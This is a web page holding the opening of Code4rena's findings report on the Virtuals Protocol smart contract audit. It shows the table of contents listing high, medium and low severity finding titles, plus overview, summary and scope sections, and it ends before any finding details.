<!DOCTYPE html><html lang="en" class="dark __variable_145019 __variable_7d3254 __variable_38ceec"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/aa1e03632b0a9f00.css" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/2f6eba9e2eba112a.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-ee83ff9cf0b0c89c.js"/><script src="/_next/static/chunks/fd9d1056-eb8d5211d3c9c065.js" async=""></script><script src="/_next/static/chunks/2117-a3b19a97c1cb31ce.js" async=""></script><script src="/_next/static/chunks/main-app-3138c406eafafcb7.js" async=""></script><script src="/_next/static/chunks/2972-f84899d403fe0acb.js" async=""></script><script src="/_next/static/chunks/app/reports/error-337d8165658cb655.js" async=""></script><script src="/_next/static/chunks/da2599a7-883aa94cd391c09d.js" async=""></script><script src="/_next/static/chunks/aaea2bcf-7a609d2a8547b978.js" async=""></script><script src="/_next/static/chunks/c16f53c3-1c73b34d2bc72b67.js" async=""></script><script src="/_next/static/chunks/0815f603-89dbad4b5756c5c4.js" async=""></script><script src="/_next/static/chunks/5878-bdbba189b5f619d7.js" async=""></script><script src="/_next/static/chunks/1700-bbc1d97db9b9492c.js" async=""></script><script src="/_next/static/chunks/2636-173262633c516a97.js" async=""></script><script src="/_next/static/chunks/3504-22e800882144201d.js" async=""></script><script src="/_next/static/chunks/4105-30871074ad2edc9d.js" async=""></script><script src="/_next/static/chunks/6390-77d8d06791482011.js" async=""></script><script src="/_next/static/chunks/6686-dd6382cfde9e8708.js" async=""></script><script src="/_next/static/chunks/5813-7499623caf5cc29b.js" async=""></script><script src="/_next/static/chunks/1638-02441f876b022d5b.js" async=""></script><script src="/_next/static/chunks/191-3b7605585cbf7c3b.js" async=""></script><script src="/_next/static/chunks/867-ac7b2edcc9aa90cf.js" async=""></script><script src="/_next/static/chunks/7834-0fb33076adf039e3.js" async=""></script><script src="/_next/static/chunks/app/layout-2a5c32924dd978a9.js" async=""></script><script src="/_next/static/chunks/app/not-found-c0beac80bd3674ca.js" async=""></script><script src="/_next/static/chunks/app/reports/%5Bslug%5D/page-7e2f67b2ed9d0f65.js" async=""></script><title>Code4rena | Keeping high severity bugs out of production</title><meta name="description" content="Top auditors compete to keep high severity bugs out of production. Start a public or private audit within 48 hours."/><meta name="application-name" content="Code4rena | Keeping high severity bugs out of production"/><meta property="og:title" content="Code4rena"/><meta property="og:description" content="Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method."/><meta property="og:site_name" content="Code4rena"/><meta property="og:image" content="https://code4rena.com/images/c4/c4-og-v2.png"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Code4rena"/><meta name="twitter:description" content="Code4rena is a competitive audit platform that finds more high-severity vulnerabilities, more quickly than any other auditing method."/><meta name="twitter:image" content="https://code4rena.com/images/c4/c4-og-v2.png"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="256x256"/><link rel="icon" href="/logos/c4/c4-favicon-32.png"/><link rel="apple-touch-icon" href="/logos/c4/apple-touch-icon.png"/><meta name="next-size-adjust"/><title>Virtuals Protocol</title><meta property="og:title" content="Virtuals Protocol"/><meta name="twitter:title" content="Virtuals Protocol"/><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body><div class="wrapper__grid"><div class="Toastify"></div><!--$--><!--/$--><header class="header full-width--padded "><a class="visually-hidden focusable skip-link" href="#skip-link">Skip Navigation</a><nav aria-label="Desktop Navigation" class="header__nav"><a class="logo" href="/"><img alt="Code4rena Logo" loading="lazy" width="143" height="28" decoding="async" data-nimg="1" style="color:transparent" src="/logos/c4/c4-logo.svg"/></a><ul class="header__nav-links"><div class="header__nav-separator"></div><li><button class="header__nav-link__btn" aria-haspopup="true" aria-expanded="false" aria-controls="for_projects_submenu" type="button">For Projects<svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-secondary)" fill-rule="evenodd" clip-rule="evenodd" d="M4.7636 8.2636C5.11508 7.91213 5.68492 7.91213 6.0364 8.2636L10.9 13.1272L15.7636 8.2636C16.1151 7.91213 16.6849 7.91213 17.0364 8.2636C17.3879 8.61508 17.3879 9.18492 17.0364 9.5364L11.5364 15.0364C11.1849 15.3879 10.6151 15.3879 10.2636 15.0364L4.7636 9.5364C4.41213 9.18492 4.41213 8.61508 4.7636 8.2636Z"></path></g></svg></button><div class="submenu__wrapper"><div id="for_projects_submenu" aria-hidden="true" aria-label="For Projects Submenu" class="header__nav-links__dropdown"><div class="dropdown__promo_parent"><div class="dropdown__promo"><div class="dropdown__promo_text"><h2>Ready to secure your project?</h2><p>The best time to start is now.</p></div><div class="dropdown__promo_button"><a target="_blank" rel="noreferrer noopener" class="" tabindex="-1" href="https://go.code4rena.com/start?source=header-nav"><button class="marketing-btn__small marketing-btn__gradient" type="button" aria-label="Get started (opens in new window)"><div class="marketing-btn__text">Get started</div><svg width="16px" height="16px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="#fff" fill-rule="evenodd" clip-rule="evenodd" d="M10.6803 4.2636C11.0317 3.91213 11.6016 3.91213 11.953 4.2636L18.3697 10.6803C18.5385 10.8491 18.6333 11.078 18.6333 11.3167C18.6333 11.5554 18.5385 11.7843 18.3697 11.9531L11.953 18.3697C11.6016 18.7212 11.0317 18.7212 10.6803 18.3697C10.3288 18.0183 10.3288 17.4484 10.6803 17.0969L15.5605 12.2167H4.89998C4.40293 12.2167 3.99998 11.8137 3.99998 11.3167C3.99998 10.8196 4.40293 10.4167 4.89998 10.4167H15.5605L10.6803 5.5364C10.3288 5.18492 10.3288 4.61508 10.6803 4.2636Z"></path></g></svg></button></a></div></div></div><div class="dropdown__content"><div class="dropdown__content__wrapper"><strong class="content__label__decorated_full">Security solutions</strong><ul class="dropdown__content__col decorated_full"><li><a aria-label="Competitive audit" class="dropdown__content__link__decorated__full" href="/competitive-audit"><div><div class="dropdown__content__link__label">Competitive audit</div><p class="dropdown__content__link__description">We invented the format that disrupted the web3 industry. Find out why top protocols trust C4.</p></div></a></li><li><a aria-label="Zenith" class="dropdown__content__link__decorated__full" href="/zenith"><div><div class="dropdown__content__link__label">Zenith</div><p class="dropdown__content__link__description">Zenith assembles auditors with proven track records to secure your project.</p></div></a></li></ul></div><div class="dropdown__content__wrapper"><strong class="content__label__simple">Resources</strong><ul class="dropdown__content__col simple"><li><a target="_blank" rel="noreferrer noopener" aria-label="Docs (opens in new window)" href="https://docs.code4rena.com"><div class="dropdown__content__link__label">Docs</div></a></li><li><a aria-label="Reports" href="/reports"><div class="dropdown__content__link__label">Reports</div></a></li></ul></div></div></div></div></li><li><button class="header__nav-link__btn" aria-haspopup="true" aria-expanded="false" aria-controls="for_wardens_submenu" type="button">For Wardens<svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="var(--color__text-secondary)" fill-rule="evenodd" clip-rule="evenodd" d="M4.7636 8.2636C5.11508 7.91213 5.68492 7.91213 6.0364 8.2636L10.9 13.1272L15.7636 8.2636C16.1151 7.91213 16.6849 7.91213 17.0364 8.2636C17.3879 8.61508 17.3879 9.18492 17.0364 9.5364L11.5364 15.0364C11.1849 15.3879 10.6151 15.3879 10.2636 15.0364L4.7636 9.5364C4.41213 9.18492 4.41213 8.61508 4.7636 8.2636Z"></path></g></svg></button><div class="submenu__wrapper"><div id="for_wardens_submenu" aria-hidden="true" aria-label="For Wardens Submenu" class="header__nav-links__dropdown"><div class="dropdown__promo_parent"><div class="dropdown__promo"><div class="dropdown__promo_text"><h2>Find bugs. Get paid.</h2><p>Put your security research skills to work.</p></div><div class="dropdown__promo_button"><a class="" tabindex="-1" href="/register/account"><button class="marketing-btn__small marketing-btn__gradient" type="button" aria-label="Become a Warden"><div class="marketing-btn__text">Become a Warden</div><svg width="16px" height="16px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g><path fill="#fff" fill-rule="evenodd" clip-rule="evenodd" d="M10.6803 4.2636C11.0317 3.91213 11.6016 3.91213 11.953 4.2636L18.3697 10.6803C18.5385 10.8491 18.6333 11.078 18.6333 11.3167C18.6333 11.5554 18.5385 11.7843 18.3697 11.9531L11.953 18.3697C11.6016 18.7212 11.0317 18.7212 10.6803 18.3697C10.3288 18.0183 10.3288 17.4484 10.6803 17.0969L15.5605 12.2167H4.89998C4.40293 12.2167 3.99998 11.8137 3.99998 11.3167C3.99998 10.8196 4.40293 10.4167 4.89998 10.4167H15.5605L10.6803 5.5364C10.3288 5.18492 10.3288 4.61508 10.6803 4.2636Z"></path></g></svg></button></a></div></div></div><div class="dropdown__content"><div class="dropdown__content__wrapper"><strong class="content__label__simple">Audits</strong><ul class="dropdown__content__col simple"><li><a aria-label="Ongoing audits" href="/audits#active-audits"><div class="dropdown__content__link__label">Ongoing audits</div></a></li><li><a aria-label="Upcoming audits" href="/audits#upcoming-audits"><div class="dropdown__content__link__label">Upcoming audits</div></a></li><li><a aria-label="Past audits" href="/audits#completed-audits"><div class="dropdown__content__link__label">Past audits</div></a></li><li><a aria-label="Bounties" href="/bounties"><div class="dropdown__content__link__label">Bounties</div></a></li></ul></div><div class="dropdown__content__wrapper"><strong class="content__label__simple">Leaderboard</strong><ul class="dropdown__content__col simple"><li><a aria-label="Past 90 days" href="/leaderboard?timeframe=Last 90 days"><div class="dropdown__content__link__label">Past 90 days</div></a></li><li><a aria-label="Past 365 days" href="/leaderboard?timeframe=Last 365 days"><div class="dropdown__content__link__label">Past 365 days</div></a></li><li><a aria-label="All time" href="/leaderboard?timeframe=All time"><div class="dropdown__content__link__label">All time</div></a></li></ul></div><div class="dropdown__content__wrapper"><strong class="content__label__simple">Resources</strong><ul class="dropdown__content__col simple"><li><a aria-label="Reports" href="/reports"><div class="dropdown__content__link__label">Reports</div></a></li><li><a aria-label="Help desk" href="/help"><div class="dropdown__content__link__label">Help desk</div></a></li><li><a target="_blank" rel="noreferrer noopener" aria-label="Docs (opens in new window)" href="https://docs.code4rena.com"><div class="dropdown__content__link__label">Docs</div></a></li><li><a target="_blank" rel="noreferrer noopener" aria-label="GitHub (opens in new window)" href="https://github.com/code-423n4/"><div class="dropdown__content__link__label">GitHub</div></a></li></ul></div></div></div></div></li><li class="header__user-help__wrapper"><a class="header__user-help" href="/help">Support</a></li><li class="header__user-login__wrapper"><a class="header__user-login" href="/login">Log in</a></li><div class="login__mobile"><h2>Login</h2><a class="login__link" href="/login"><img alt="login icon" loading="lazy" width="20" height="20" decoding="async" data-nimg="1" class="login__icon" style="color:transparent" src="/images/sign-out.svg"/>Log in / Register</a></div><a target="_blank" rel="noreferrer noopener" class="spacing-bottom__m spacing-left__s" tabindex="-1" href="https://go.code4rena.com/start?source=header-nav"><button class="marketing-btn__small marketing-btn__gradient" type="button" aria-label="Get an audit (opens in new window)"><div class="marketing-btn__text">Get an audit</div></button></a></ul></nav><nav aria-label="Mobile Navigation" class="header__nav__mobile"><div class="header__logo-and-burger"><a class="logo" href="/"><img alt="Code4rena Logo" loading="lazy" width="143" height="28" decoding="async" data-nimg="1" style="color:transparent" src="/logos/c4/c4-logo.svg"/></a><div class="mobile__nav__wrapper"><div class="mobile__nav__overlay"></div><div id="c4_mobile_nav" class="mobile__nav__body" aria-hidden="true"></div></div><button class="hamburger" aria-label="Open menu" aria-expanded="false" aria-controls="c4_mobile_nav" type="button"><svg width="24px" height="24px" viewBox="0 0 22 22" fill="none" xmlns="http://www.w3.org/2000/svg"><g id="menu"><g id="Vector"><path fill="#d8d8d8" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 10.7333C2.99988 10.2362 3.40282 9.83325 3.89988 9.83325H18.5665C19.0636 9.83325 19.4665 10.2362 19.4665 10.7333C19.4665 11.2303 19.0636 11.6333 18.5665 11.6333H3.89988C3.40282 11.6333 2.99988 11.2303 2.99988 10.7333Z"></path><path fill="#d8d8d8" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 5.23325C2.99988 4.7362 3.40282 4.33325 3.89988 4.33325H18.5665C19.0636 4.33325 19.4665 4.7362 19.4665 5.23325C19.4665 5.73031 19.0636 6.13325 18.5665 6.13325H3.89988C3.40282 6.13325 2.99988 5.73031 2.99988 5.23325Z"></path><path fill="#d8d8d8" fill-rule="evenodd" clip-rule="evenodd" d="M2.99988 16.2333C2.99988 15.7362 3.40282 15.3333 3.89988 15.3333H18.5665C19.0636 15.3333 19.4665 15.7362 19.4665 16.2333C19.4665 16.7303 19.0636 17.1333 18.5665 17.1333H3.89988C3.40282 17.1333 2.99988 16.7303 2.99988 16.2333Z"></path></g></g></svg></button></div></nav><span id="skip-link"></span></header><main><div class="report-page"><div class="limited-width type__copy"><div class="type__article"><div class="logo-64"><img alt="Virtuals Protocol" loading="lazy" decoding="async" data-nimg="fill" class="rounded" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="80px" srcSet="/_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=16&amp;q=75 16w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=32&amp;q=75 32w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=48&amp;q=75 48w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=64&amp;q=75 64w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=96&amp;q=75 96w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=128&amp;q=75 128w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=256&amp;q=75 256w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=384&amp;q=75 384w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=640&amp;q=75 640w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=750&amp;q=75 750w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=828&amp;q=75 828w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=1080&amp;q=75 1080w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=1200&amp;q=75 1200w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=1920&amp;q=75 1920w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=2048&amp;q=75 2048w, /_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=3840&amp;q=75 3840w" src="/_next/image?url=https%3A%2F%2Fcode4-api-v0-public-storage.s3.us-east-1.amazonaws.com%2Fupload-vhVEYuJvCb2&amp;w=3840&amp;q=75"/></div><div class="report-header"><h1>Virtuals Protocol<!-- --> <br/> Findings &amp; Analysis Report</h1><h4>2025-08-04</h4></div><div class="report-container"><h2>Table of contents</h2><div class="report-toc markdown-body"><ul>
<li>
<p><a href="#overview">Overview</a></p>
<ul>
<li><a href="#about-c4">About C4</a></li>
</ul>
</li>
<li><a href="#summary">Summary</a></li>
<li><a href="#scope">Scope</a></li>
<li><a href="#severity-criteria">Severity Criteria</a></li>
<li>
<p><a href="#high-risk-findings-6">High Risk Findings (6)</a></p>
<ul>
<li><a href="#h-01-lack-of-access-control-in-agentnftv2addvalidator-enables-unauthorized-validator-injection-and-causes-reward-accounting-inconsistencies">[H-01] Lack of access control in <code>AgentNftV2::addValidator()</code> enables unauthorized validator injection and causes reward accounting inconsistencies</a></li>
<li><a href="#h-02-anybody-can-control-a-users-delegate-by-calling-agentvetokenstake-with-1-wei">[H-02] Anybody can control a user’s delegate by calling <code>AgentVeToken.stake()</code> with 1 wei</a></li>
<li><a href="#h-03-public-servicenftupdateimpact-call-leads-to-cascading-issue">[H-03] Public <code>ServiceNft::updateImpact</code> call leads to cascading issue</a></li>
<li><a href="#h-04-public-contributionnftmint-leads-to-cascading-issues--loss-of-funds">[H-04] Public <code>ContributionNft::mint</code> leads to cascading issues / loss of funds</a></li>
<li><a href="#h-05-validatorregistryvalidatorscoregetpastvalidatorscore-allows-validator-to-earn-full-rewards-without-actually-engaging-with-the-protocol">[H-05] <code>ValidatorRegistry::validatorScore/getPastValidatorScore</code> allows validator to earn full rewards without actually engaging with the protocol</a></li>
<li><a href="#h-06-missing-prevagentidupdate-in-promptmulti-function-may-cause-token-loss-by-transferring-to-address0">[H-06] Missing <code>prevAgentId</code>update in <code>promptMulti()</code> function may cause token loss by transferring to <code>address(0)</code></a></li>
</ul>
</li>
<li>
<p><a href="#medium-risk-findings-26">Medium Risk Findings (26)</a></p>
<ul>
<li><a href="#m-01-attacker-can-prevent-user-from-executing-application-registered-through-initfromtoken-in-agentfactoryv4">[M-01] Attacker can prevent user from executing application registered through <code>initFromToken()</code> in <code>AgentFactoryV4</code>.</a></li>
<li><a href="#m-02-missing-slippage-protection-on-buy-and-sell">[M-02] Missing slippage protection on buy and sell</a></li>
<li><a href="#m-03-slippage-protection-in-agenttaxdcasell-and-bondingtaxswapforasset-is-calculated-at-execution-time-effectively-retrieving-the-very-same-price-that-the-trade-will-be-executing-at-ultimately-providing-no-protection">[M-03] Slippage protection in <code>AgentTax::dcaSell</code> and <code>BondingTax::swapForAsset</code> is calculated at execution time, effectively retrieving the very same price that the trade will be executing at, ultimately providing no protection</a></li>
<li><a href="#m-04-launched-tokens-are-vulnerable-to-flashloan-attacks-forcing-premature-graduation-allowing-reward-manipulation">[M-04] Launched tokens are vulnerable to flashloan attacks forcing premature graduation, allowing reward manipulation</a></li>
<li><a href="#m-05-division-in-bondingsol_opentradingonuniswap-results-in-an-incorrect-lpsupply-higher-vaultsupply-and-dust-agenttokens-getting-locked-in-fpair">[M-05] Division in <code>Bonding.sol._openTradingOnUniswap()</code> results in an incorrect <code>lpSupply</code>, higher <code>vaultSupply</code>, and dust <code>AgentTokens</code> getting locked in <code>FPair</code></a></li>
<li><a href="#m-06-bondingtax-has-invalid-slippage-implementation">[M-06] <code>BondingTax</code> has invalid slippage implementation</a></li>
<li><a href="#m-07-amountoutmin-passed-in-as-0-in-agenttoken_swaptax-leads-to-loss-of-funds-due-to-slippage">[M-07] <code>amountOutMin</code> passed in as 0 in <code>AgentToken::_swapTax</code> leads to loss of funds due to slippage</a></li>
<li><a href="#m-08-score-in-agentdao-is-not-an-accurate-measure-and-can-be-artificially-inflated-by-spamming-proposals">[M-08] Score in <code>AgentDAO</code> is not an accurate measure and can be artificially inflated by spamming proposals</a></li>
<li><a href="#m-09-functions-in-ferc20-cant-be-invoked">[M-09] Functions in FERC20 can’t be invoked</a></li>
<li><a href="#m-10-missing-totalsupply-reduction-in-burnfrom-allows-supply-manipulation-erc20-violation">[M-10] Missing <code>totalSupply</code> reduction in <code>burnFrom</code> allows supply manipulation (ERC20 Violation)</a></li>
<li><a href="#m-11-agentdao_castvote-doesnt-check-the-array-of-votes-emitted-which-determine-the-number-of-battles-fought-in-elocalculatorsol-allowing-the-user-to-increase-the-elo-of-a-contribution-unfairly-inflating-the-maturityimpact-of-servicenfts">[M-11] <code>AgentDAO::_castVote</code> doesn’t check the array of votes emitted, which determine the number of battles fought in <code>EloCalculator.sol</code>, allowing the user to increase the ELO of a contribution unfairly, inflating the maturity/impact of <code>ServiceNFTs</code></a></li>
<li><a href="#m-12-no-slippage-protection-during-adding-liquidity-to-uniswap">[M-12] No slippage protection during adding liquidity to uniswap</a></li>
<li><a href="#m-13-removal-of-a-liquidity-pool-on-agenttokenremoveliquiditypool-still-incurs-taxes-on-swaps">[M-13] Removal of a liquidity pool on <code>AgentToken::removeLiquidityPool</code> still incurs taxes on swaps</a></li>
<li><a href="#m-14-votesupgradeabledelegate-bypasses-the-addvalidator-call-leads-to-a-non-validator-holding-voting-power-along-with-loss-of-rewards">[M-14] <code>VotesUpgradeable::delegate</code> bypasses the <code>addValidator</code> call, leads to a non-validator holding voting power along with loss of rewards</a></li>
<li><a href="#m-15-if-ffactorybuytax-and--or-ffactoryselltax-is-set-to-0-buy--sell-would-revert">[M-15] If <code>FFactory::buyTax</code> and / or <code>FFactory::sellTax</code> is set to 0, buy / sell would revert</a></li>
<li><a href="#m-16-elo-calculation-error">[M-16] <code>Elo</code> calculation error</a></li>
<li><a href="#m-17-virtualgenesisdaosolearlyexecute-proposals-can-be-executed-two-times">[M-17] <code>VirtualGenesisDAO.sol:earlyExecute()</code> proposals can be executed two times</a></li>
<li><a href="#m-18-genesissolongenesissuccess-users-may-lose-their-unclaimed-agenttokens-if-a-second-launch-occurs-before-theyve-claimed-their-rewards-from-the-first">[M-18] <code>Genesis.sol:onGenesisSuccess()</code> users may lose their unclaimed <code>agentTokens</code> if a second launch occurs before they’ve claimed their rewards from the first</a></li>
<li><a href="#m-19-lack-of-maturity-check-for-non-founder-users-allowing-immediate-withdrawals">[M-19] Lack of maturity check for non-founder users allowing immediate withdrawals</a></li>
<li><a href="#m-20-delegation-not-revoked-on-withdrawal-allows-reward-and-voting-power-inflation-post-maturity">[M-20] Delegation not revoked on withdrawal allows reward and voting power inflation post-maturity</a></li>
<li><a href="#m-21-battleelo-is-at-risk-of-underflow-revert-which-may-dos-voting">[M-21] <code>battleElo</code> is at risk of underflow revert, which may DOS voting</a></li>
<li><a href="#m-22-founder-has-to-double-stake-during-migration-with-the-initial-lp-locked-in-the-old-vetoken">[M-22] Founder has to double-stake during migration with the initial LP locked in the old <code>veToken</code></a></li>
<li><a href="#m-23-using-agentfactorysetassettoken-will-lead-to-loss-of-funds">[M-23] Using <code>AgentFactory::setAssetToken</code> will lead to loss of funds</a></li>
<li><a href="#m-24-precision-loss-in-pricealast-and-priceblast">[M-24] Precision loss in <code>priceALast</code> and <code>priceBLast</code></a></li>
<li><a href="#m-25-incorrect-mathematical-logic">[M-25] Incorrect mathematical logic</a></li>
<li><a href="#m-26-imprecise-calculations-in-launchfor-lead-to-less-liquidity-be-added-to-the-pair-via-the-router">[M-26] Imprecise calculations in <code>launchFor()</code> lead to less liquidity be added to the pair via the router</a></li>
</ul>
</li>
<li>
<p><a href="#low-risk-and-non-critical-issues">Low Risk and Non-Critical Issues</a></p>
<ul>
<li><a href="#01-missing-update-of-prevagentid-in-promptmulti">01 Missing update of <code>prevAgentId</code> in <code>promptMulti</code></a></li>
<li><a href="#02-duplicate-import-statement-for-mathsol">02 Duplicate import statement for <code>Math.sol</code></a></li>
<li><a href="#03-invalid-agentid-leads-to-token-burning">03 Invalid <code>agentId</code> leads to token burning</a></li>
<li><a href="#04-risky-one-step-admin-transfer-in-contributionnftsol">04 Risky one-step admin transfer in <code>ContributionNft.sol</code></a></li>
<li><a href="#05-fee-induced-reserve-inconsistency-in-frouter">05 Fee-induced reserve inconsistency in <code>FRouter</code></a></li>
<li><a href="#06-duplicate-import-statement-for-agentfactoryv3sol-in-fgenesissol">06 Duplicate import statement for <code>AgentFactoryV3.sol</code> in <code>FGenesis.sol</code></a></li>
<li><a href="#07-misconception-in-using-blocktimestamp--x-for-swap-deadlines">07 Misconception in using <code>block.timestamp + X</code> for swap deadlines</a></li>
<li><a href="#08-widespread-use-of-infinite-token-approvals">08 Widespread use of infinite token approvals</a></li>
<li><a href="#09-missing-virtual-functions-for-inheritance">09 Missing <code>virtual</code> functions for inheritance</a></li>
<li><a href="#10-totalsupply-not-updated-on-burning-in-ferc20">10 <code>totalSupply</code> not updated on burning in <code>FERC20</code></a></li>
<li><a href="#11-wrong-max-transaction-limit-after-burns">11 Wrong max transaction limit after burns</a></li>
</ul>
</li>
<li><a href="#disclosures">Disclosures</a></li>
</ul></div><div class="report-contents markdown-body"><h1 style="position:relative;" id="overview"><a class="anchor before" aria-label="overview permalink" href="#overview"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Overview</h1>
<h2 style="position:relative;" id="about-c4"><a class="anchor before" aria-label="about c4 permalink" href="#about-c4"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>About C4</h2>
<p>Code4rena (C4) is a competitive audit platform where security researchers, referred to as Wardens, review, audit, and analyze codebases for security vulnerabilities in exchange for bounties provided by sponsoring projects.</p>
<p>A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>
<p>During the audit outlined in this document, C4 conducted an analysis of the Virtuals Protocol smart contract system. The audit took place from April 17 to May 07, 2025.</p>
<p>Final report assembled by Code4rena.</p>
<h1 style="position:relative;" id="summary"><a class="anchor before" aria-label="summary permalink" href="#summary"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Summary</h1>
<p>The C4 analysis yielded an aggregated total of 32 unique vulnerabilities. Of these vulnerabilities, 6 received a risk rating in the category of HIGH severity and 26 received a risk rating in the category of MEDIUM severity.</p>
<p>Additionally, C4 analysis included 38 reports detailing issues with a risk rating of LOW severity or non-critical. </p>
<p>All of the issues presented here are linked back to their original finding, which may include relevant context from the judge and Virtuals Protocol team.</p>
<h1 style="position:relative;" id="scope"><a class="anchor before" aria-label="scope permalink" href="#scope"><svg width="16" viewBox="0 0 16 16" version="1.1" height="16" aria-hidden="true"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Scope</h1>
<p>The code under review can be found within the <a href="https://github.com/code-423n4/2025-04-virtuals-protocol">C4 Virtuals Protocol repository</a>, and is composed of 43 smart contracts written in the Solidity programming language and includes 5,238 lines of Solidity code.</p>
